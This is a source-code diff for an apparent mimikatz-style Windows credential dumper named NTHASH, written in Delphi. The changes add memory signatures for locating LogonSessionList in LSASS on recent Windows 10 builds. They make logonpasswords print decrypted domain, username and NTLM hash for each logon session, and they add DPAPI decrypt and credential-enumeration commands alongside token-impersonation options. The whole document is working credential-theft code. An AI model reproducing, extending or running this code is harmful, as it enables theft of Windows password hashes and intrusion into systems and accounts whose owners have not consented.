@@ -13,7 +13,7 @@ end;
   //session_entry to creds_entry to cred_hash_entry to ntlm_creds_block
 
   type _credentialkeys=record
-       unk1:array[0..55] of byte;
+       unk1:array[0..55] of byte; //lots of things i am missing ...
        ntlmhash:array[0..15] of byte;
        end;
     Pcredentialkeys=^_credentialkeys;
@@ -40,18 +40,19 @@ end;
     PCRED_NTLM_BLOCK=^_CRED_NTLM_BLOCK;
 
   type _KIWI_MSV1_0_PRIMARY_CREDENTIALS =record
-	//next:pointer;    //actually probably a lsa_unicode_string len & bufer
+	//probably a lsa_unicode_string len & bufer
        len:word;
        maxlen:word;
        unk1:dword;
-       Primary:pointer; //buffer part of a lsa_unicode_string?
-	Credentials:LSA_UNICODE_STRING; //buffer contains a cred_ntlm_block
+       Primary:pointer; //a string like Primary#0 or CredentialKeys#
+       //
+       Credentials:LSA_UNICODE_STRING; //buffer contains a cred_ntlm_block
 
         end;
  PKIWI_MSV1_0_PRIMARY_CREDENTIALS=^_KIWI_MSV1_0_PRIMARY_CREDENTIALS;
 
   type _KIWI_MSV1_0_CREDENTIALS =record
-	next:pointer;
+	next:pointer;    //loop ...
 	AuthenticationPackageId:DWORD;
 	PrimaryCredentials:PKIWI_MSV1_0_PRIMARY_CREDENTIALS;
   end;
@@ -100,7 +101,7 @@ type _KIWI_MSV1_0_LIST_63 =record
 	unk27:PVOID;
 	unk28:PVOID;
 	unk29:PVOID;
-	CredentialManager:PVOID;
+	CredentialManager:PVOID; //need to investigate here - password are encrypted in clear here
         end;
  PKIWI_MSV1_0_LIST_63=^_KIWI_MSV1_0_LIST_63;
 
@@ -134,16 +135,17 @@ type i_logsesslist=record
      this:nativeuint;
      luid:nativeuint;
      unk1:nativeuint;
-     //unk2:nativeuint;
+     //a lsa unicode string
      len1:word;
      maxlen1:word;
      unk2:dword;
      usernameptr:nativeuint;
-     //minmax:nativeuint;
+     //a lsa unicode string
      len2:word;
      maxlen2:word;
      unk3:dword;
      domainptr:nativeuint;
+     //a lsa unicode string
      len3:word;
      maxlen3:word;
      unk4:dword;
@@ -254,6 +256,7 @@ begin
 	begin
 		//hKey = &kAes.hKey;
 		cbIV := sizeof(iv);
+                log('cbmemory:'+inttostr(cbmemory));
                 log('aes encrypted:'+ByteToHexaString (encrypted));
                 if bdecrypt(BCRYPT_AES_ALGORITHM,encrypted,@decrypted[0],aeskey,iv)>0 then result:=true;
 
@@ -262,6 +265,7 @@ begin
 	begin
 		//hKey = &k3Des.hKey;
 		cbIV := sizeof(iv) div 2;
+                log('cbmemory:'+inttostr(cbmemory));
                 log('des encrypted:'+ByteToHexaString (encrypted));
                 if bdecrypt(BCRYPT_3DES_ALGORITHM,encrypted,@decrypted[0],deskey,iv)>0 then result:=true;
         end;
@@ -712,8 +716,11 @@ end;
 function logonpasswords(pid:dword;module:string):boolean;
 const
   //dd Lsasrv!LogonSessionList in windbg
+  PTRN_WN1803_LogonSessionList:array [0..11] of byte= ($33, $ff, $41, $89, $37, $4c, $8b, $f3, $45, $85, $c9, $74);
+  //1703 works for 1709
   PTRN_WN1703_LogonSessionList:array [0..11] of byte= ($33, $ff, $45, $89, $37, $48, $8b, $f3, $45, $85, $c9, $74);
   PTRN_WN63_LogonSessionList:array [0..12] of byte=($8b, $de, $48, $8d, $0c, $5b, $48, $c1, $e1, $05, $48, $8d, $05);
+  PTRN_WN6x_LogonSessionList:array [0..11] of byte= ($33, $ff, $41, $89, $37, $4c, $8b, $f3, $45, $85, $c0, $74);
   after:array[0..1] of byte=($eb,$04);
   //after:array[0..1] of byte=($0F,$84);
 var
@@ -731,7 +738,7 @@ var
   patch_pos:ShortInt=0;
   pattern:array of byte;
   logsesslist:array [0..sizeof(_KIWI_MSV1_0_LIST_63)-1] of byte;
-  bytes:array[0..254] of byte;
+  bytes:array[0..1023] of byte;
   password,decrypted:tbytes;
   //username,domain:array [0..254] of widechar;
   credentials:nativeuint;
@@ -745,12 +752,19 @@ begin
         begin
         setlength(pattern,sizeof(PTRN_WN63_LogonSessionList));
         copymemory(@pattern[0],@PTRN_WN63_LogonSessionList[0],sizeof(PTRN_WN63_LogonSessionList));
+        //{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WN63_LogonSessionList),	PTRN_WN63_LogonSessionList},	{0, NULL}, {36,  -6}},
+        patch_pos:=36;
         end ;
+     if copy(winver,1,3)='10.' then //win10
+        begin
+        setlength(pattern,sizeof(PTRN_WN1703_LogonSessionList));
+        copymemory(@pattern[0],@PTRN_WN1703_LogonSessionList[0],sizeof(PTRN_WN1703_LogonSessionList));
+        //{KULL_M_WIN_BUILD_10_1703,	{sizeof(PTRN_WN1703_LogonSessionList),	PTRN_WN1703_LogonSessionList},	{0, NULL}, {23,  -4}}
+        //{KULL_M_WIN_BUILD_10_1803,	{sizeof(PTRN_WN1803_LogonSessionList),	PTRN_WN1803_LogonSessionList},	{0, NULL}, {23,  -4}},
+        //{KULL_M_WIN_BUILD_10_1903,	{sizeof(PTRN_WN6x_LogonSessionList),	PTRN_WN6x_LogonSessionList},	{0, NULL}, {23,  -4}},
+        patch_pos:=23;
+        end;
 
-     //{KULL_M_WIN_BUILD_10_1703,	{sizeof(PTRN_WN1703_LogonSessionList),	PTRN_WN1703_LogonSessionList},	{0, NULL}, {23,  -4}}
-     patch_pos:=23;
-     //{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WN63_LogonSessionList),	PTRN_WN63_LogonSessionList},	{0, NULL}, {36,  -6}},
-     patch_pos:=36;
 
      end;
   if (lowercase(osarch)='x86') then
@@ -822,6 +836,7 @@ begin
                                    while _KIWI_MSV1_0_LIST_63 (logsesslist ).flink<>offset do
                                    begin
                                    //log('entry#this:'+inttohex(i_logsesslist (logsesslist ).this ,sizeof(pointer)),0) ;
+                                   log('**************************************************',1);
                                    log('entry#next:'+dummy,0) ;
 
                                    //log('usagecount:'+inttostr(i_logsesslist (logsesslist ).usagecount),1) ;
@@ -836,6 +851,10 @@ begin
                                    //copymemory(@domain[0],@bytes[0],64);
                                    //log('domain:'+widestring(domain),1);
                                    //
+                                   log('LUID:'+inttohex(_KIWI_MSV1_0_LIST_63 (logsesslist ).LocallyUniqueIdentifier.lowPart ,sizeof(_LUID)),1) ;
+                                   //
+                                   log('CredentialManager:'+inttohex(nativeuint(_KIWI_MSV1_0_LIST_63 (logsesslist ).CredentialManager),sizeof(pvoid)),0);
+                                   //
                                    credentials:=nativeuint(_KIWI_MSV1_0_LIST_63 (logsesslist ).Credentials);
                                    log('CredentialsPtr:'+inttohex(credentials,sizeof(pointer))) ;
                                    if Credentials<>0 then
@@ -847,7 +866,7 @@ begin
                                      begin
                                      credentials:=nativeuint(PKIWI_MSV1_0_CREDENTIALS(@bytes[0]).next);
                                      log('CREDENTIALS.next:'+inttohex (nativeuint(PKIWI_MSV1_0_CREDENTIALS(@bytes[0]).next),sizeof(pointer) ));
-                                     log('CREDENTIALS.AuthID:'+inttostr (PKIWI_MSV1_0_CREDENTIALS(@bytes[0]).AuthenticationPackageId ));
+                                     log('CREDENTIALS.AuthID:'+inttohex (PKIWI_MSV1_0_CREDENTIALS(@bytes[0]).AuthenticationPackageId,8 ),1);
                                      log('CREDENTIALS.PrimaryCredentialsPtr:'+inttohex(nativeuint(PKIWI_MSV1_0_CREDENTIALS(@bytes[0]).PrimaryCredentials)+8,sizeof(pointer))) ;
                                      //primary credentials...
                                      ReadMem  (hprocess,nativeuint(PKIWI_MSV1_0_CREDENTIALS(@bytes[0]).PrimaryCredentials)+8,bytes );
@@ -866,10 +885,20 @@ begin
                                                      then log('decryptLSA NOT OK')
                                                      else
                                                        begin
-                                                       if PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).len=7
-                                                          then log(ByteToHexaString(PCRED_NTLM_BLOCK(@decrypted[0]).ntlmhash) ,1);
-                                                       if PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).len=14
-                                                          then log(ByteToHexaString(Pcredentialkeys(@decrypted[0]).ntlmhash) ,1);
+                                                       if PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).len=7 then
+                                                          begin
+                                                          log('->Primary',1);
+                                                          //log('domainoff:'+inttostr(PCRED_NTLM_BLOCK(@decrypted[0]).domainoff)) ;
+                                                          //log('usernameoff:'+inttostr(PCRED_NTLM_BLOCK(@decrypted[0]).usernameoff)) ;
+                                                          log('domain:'+pwidechar(@decrypted[PCRED_NTLM_BLOCK(@decrypted[0]).domainoff]),1);
+                                                          log('username:'+pwidechar(@decrypted[PCRED_NTLM_BLOCK(@decrypted[0]).usernameoff]),1);
+                                                          log('ntlm:'+ByteToHexaString(PCRED_NTLM_BLOCK(@decrypted[0]).ntlmhash) ,1);
+                                                          end;
+                                                       if PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).len=14 then
+                                                          begin
+                                                          log('->CredentialKeys',1);
+                                                          log('ntlm:'+ByteToHexaString(Pcredentialkeys(@decrypted[0]).ntlmhash) ,1);
+                                                          end;
                                                        end;
                                        end;//if PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Length>0 then
                                      if credentials=0 then break;
@@ -1177,6 +1206,8 @@ begin
   log('NTHASH /getlsakeys',1);
   log('NTHASH /wdigest',1);
   log('NTHASH /logonpasswords',1);
+  log('NTHASH /cryptunprotectdata /input:filename',1);
+  log('NTHASH /cryptprotectdata /input:string',1);
   log('NTHASH /runasuser /user:username /password:password [/binary:x:\folder\bin.exe]',1);
   log('NTHASH /runastoken /pid:12345 [/binary:x:\folder\bin.exe]',1);
   log('NTHASH /runaschild /pid:12345 [/binary:x:\folder\bin.exe]',1);
@@ -1209,15 +1240,23 @@ begin
      end;
   //
   //enum_samusers(samkey);
-  //password:='Password2212';
-  //setlength(buffer,length(password));
-  //Move(password[1], buffer[0], Length(password));
-  //if CryptProtectData_ (buffer,'test.bin')=false then writeln('false');
-  //writeln(BytetoString (buffer)+'.');
+  {
+  password:='Password2212';
+  setlength(buffer,length(password));
+  Move(password[1], buffer[0], Length(password));
+  if CryptProtectData_ (buffer,'test.bin')=false then writeln('false');
+  if CryptUnProtectData_(buffer,'test.bin')=false
+     then writeln('false')
+     else writeln(BytetoAnsiString (buffer));
+  //writeln(BytetoAnsiString (buffer)+'.');
+  }
   //exit;
   //
-  //
-
+  p:=pos('/enumcred',cmdline);
+  if p>0 then
+     begin
+       try CredEnum; except end;
+     end;
   p:=pos('/getlsakeys',cmdline);
   if p>0 then
      begin
@@ -1516,7 +1555,22 @@ begin
         then log('OK',1) else log('NOT OK',1);
      exit;
      end;
-
+  p:=pos('/cryptunprotectdata',cmdline);
+  if p>0 then
+     begin
+     if input='' then exit;
+      if CryptUnProtectData_(buffer,input)=false
+         then log('CryptUnProtectData_ NOT OK',1)
+         else log('Decrypted:'+BytetoAnsiString (buffer),1);
+     end;
+  p:=pos('/cryptprotectdata',cmdline);
+  if p>0 then
+     begin
+     if input='' then exit;
+      if CryptProtectData_(AnsiStringtoByte (input) ,'encrypted.blob')=false
+         then log('CryptUnProtectData_ NOT OK',1)
+         else log('CryptUnProtectData_ OK - written : encrypted.blob',1);
+     end;
 
 end.
 
